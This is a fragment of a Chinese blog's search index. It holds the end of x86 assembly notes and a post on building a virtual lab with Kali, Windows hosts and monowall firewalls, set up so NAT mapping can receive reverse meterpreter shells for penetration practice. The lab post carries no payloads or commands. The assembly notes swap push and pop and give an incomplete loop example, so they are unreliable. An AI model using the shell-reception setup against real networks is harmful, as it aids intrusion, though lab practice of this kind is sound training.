<td align="center">XOR operand1, operand2</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">NOT 非</td>
<td align="center">NOT operand1</td>
</tr>
</tbody></table>
<h2 id="四、循环"><a href="#四、循环" class="headerlink" title="四、循环"></a>四、循环</h2><p><code>;</code>  符号为注释</p>
<p><code>l1</code> 是标签（表示这是一个循环）</p>
<p><code>&lt;loop body&gt; </code> ：需要循环的语句</p>
<p><code>loop l1</code>: 循环结束</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">l1: </span><br><span class="line">;标记</span><br><span class="line">	&lt;loop body&gt;</span><br><span class="line">loop l1</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat, stdcall</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">	mov eax, 0</span><br><span class="line">	mov ebx, 1</span><br><span class="line">	mov ecx, 10</span><br><span class="line">l1:</span><br><span class="line">	add eax, ebx</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>





<h2 id="五、栈操作"><a href="#五、栈操作" class="headerlink" title="五、栈操作"></a>五、栈操作</h2><ul>
<li><p>出栈：<code>push 寄存器或数值</code></p>
</li>
<li><p>入栈：<code>pop 目的寄存器</code></p>
</li>
</ul>
<h4 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h4><p>（助记：记住 EBP 中的 B 是 Base，代表底部（栈底））</p>
<p><img src="C:\Users\LITTLECHIEH\AppData\Roaming\Typora\typora-user-images\image-20200212003605108.png" alt="image-20200212003605108"></p>
<h2 id="六、数据移动指令"><a href="#六、数据移动指令" class="headerlink" title="六、数据移动指令"></a>六、数据移动指令</h2><ul>
<li><p>赋值：<code>mov 目的寄存器 寄存器或数值</code></p>
</li>
<li><p>传地址：<code>lea 目的寄存器 操作数</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea eax, dword ptr ss:[esp]</span><br></pre></td></tr></table></figure>
</li>
<li><p>交换：<code>xchg 操作数 操作数</code>（类似<code>lea</code>）</p>
</li>
</ul>
<h2 id="七、比较指令"><a href="#七、比较指令" class="headerlink" title="七、比较指令"></a>七、比较指令</h2><ul>
<li>相减比较：<code>cmp 目的寄存器 寄存器</code></li>
<li>相与比较：<code>test 目的寄存器 寄存器</code></li>
</ul>
<p>参考网站：</p>
<ul>
<li><a href="https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm%EF%BC%88%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%EF%BC%89">https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm（科学上网）</a></li>
</ul>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>二进制逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>真实的内网环境搭建</title>
    <url>/2021/03/25/%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="网络拓扑图及通信原理"><a href="#网络拓扑图及通信原理" class="headerlink" title="网络拓扑图及通信原理"></a>网络拓扑图及通信原理</h2><p><img src="https://img-blog.csdnimg.cn/20210320230449202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>假如我们的笔记本代表我们的宿主机Kali，旁边的是我们自己公司的防火墙，云代表互联网，对面的是对面公司的防火墙和内网服务器，分别是win7和Windows Server2003。</p>
<p>现在我们要对其内网进行渗透攻击，那么我们就必须要获得对面主机反弹回来的meterpreter shell，我们有两种方式，一种是通过VPS代理的方式接收反弹回来的shell；另一种是通过设置防火墙的NAT映射，将IP地址进行映射从而接收反弹的shell连接。</p>
<span id="more"></span>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先我们先安装win7和windows server2003，并添加一个VMnet2虚拟网络，VMnet2和VMnet1的IP地址设置为动态获得。<br><img src="https://img-blog.csdnimg.cn/20210320231302827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>windows7</strong><br><img src="https://img-blog.csdnimg.cn/20210320233341719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>windows server2003</strong><br><img src="https://img-blog.csdnimg.cn/20210320233413526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Kali</strong><br><img src="https://img-blog.csdnimg.cn/20210320233447842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<!--more-->

<p>然后安装monowall软路由防火墙，这节必须跟着步骤一步步来，不然很难配置好。(反正我就折腾了一天 ╮(╯▽╰)╭)</p>
<p>这是monowall的下载地址，我们要下载的是iso镜像文件<br><a href="https://archiveos.org/monowall/">https://archiveos.org/monowall/</a><br><img src="https://img-blog.csdnimg.cn/20210320231702299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后新建虚拟机，选择FreeBSD和更早的版本(这里最好是选32位的)<br><img src="https://img-blog.csdnimg.cn/20210320231847317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103202319019.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>新建完成后，跟着这位大佬的操作一步步来，因为太多细节了，这里也说不完，配置好的mono01和mono02分别如下图所示<br><a href="https://blog.csdn.net/tluio/article/details/81292992">https://blog.csdn.net/tluio/article/details/81292992</a></p>
<p><strong>mono01</strong><br><img src="https://img-blog.csdnimg.cn/20210320232817531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210320233238948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>mono02</strong><br><img src="https://img-blog.csdnimg.cn/20210320232851327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210320233253742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>tips：这里稍微提醒下就是，当我们安装完成后，必须把安装光盘弹出，要不然会读取失败</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>首先是对我们自己公司的防火墙也就是<strong>mono01</strong>进行配置，LAN那个保持默认就好，我们得添加NAT规则和外网转发策略<br><img src="https://img-blog.csdnimg.cn/20210320233950438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>取消掉这个选项，因为他屏蔽了类似192.168的网段的连接，点击save<br><img src="https://img-blog.csdnimg.cn/20210320234159252.png" alt="在这里插入图片描述"></p>
<p>NAT规则的设置，设置完成记得点保存！！！<br><img src="https://img-blog.csdnimg.cn/20210320234427762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后接着我们设置<strong>mono02</strong>的配置，mono02的配置较简单，只需将Block选项取消掉即可<br><img src="https://img-blog.csdnimg.cn/20210320234644747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了检验最后的效果，我们在kali上开启一个服务器，监听的端口号为4444<br><img src="https://img-blog.csdnimg.cn/20210320234947351.png" alt="在这里插入图片描述"><br>在win7上访问mono01的公网IP，显示连接成功即搭建成功！！！<br><img src="https://img-blog.csdnimg.cn/20210320235029633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
</search>
